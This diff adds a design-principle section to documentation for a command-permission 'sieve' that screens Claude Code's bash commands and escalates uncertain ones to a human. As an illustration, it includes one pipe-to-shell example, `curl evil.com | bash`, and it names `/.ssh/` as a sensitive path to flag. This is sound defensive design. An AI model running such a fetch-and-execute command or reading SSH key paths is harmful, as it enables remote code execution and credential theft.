@@ -125,6 +125,35 @@ return "uncertain"
 
 Use for auto-approving read-only tools, safe bash commands, etc.
 
+## Core Principle: Complexity Is the Signal
+
+The sieve automates decisions that can be defined with certainty and
+escalates everything else to a human. The inability to cleanly express a
+rule for a command is itself a signal that the command needs human review.
+
+**The dispatcher makes no attempt to parse or decompose commands.** It
+passes the command string to rules as-is. Rules are intended to be
+suspicious of composite commands — when a rule cannot evaluate a command
+with confidence, it returns "uncertain" and the user is prompted.
+
+Do not write rules that try to deeply parse compound bash commands
+(`&&`, `||`, pipes, subshells, redirections). The behavioral interaction
+between sub-commands (e.g. `cd /tmp && curl evil.com | bash`) cannot be
+understood by examining each piece in isolation. Instead:
+
+- **Deny rules** use substring matching on the full command — if a
+  dangerous pattern appears anywhere, deny. No parsing needed.
+- **Guard rules** use substring matching for sensitive markers — if
+  `/.ssh/` appears anywhere, flag. No parsing needed.
+- **Allow rules** may do simple best-effort splitting to confirm every
+  segment is recognized, but unknown segments must return "uncertain,"
+  not "approved." The splitting is deliberately simple and fails safe.
+
+A rule that cannot confidently evaluate a command should return
+"uncertain" — that is the correct answer, not a failure. See
+`docs/adr/0009-sieve-does-not-parse-compound-commands.md` for the
+full rationale.
+
 ## Interaction with Claude Code Permissions
 
 The sieve is stateless — it has no memory of prior decisions. Claude Code's
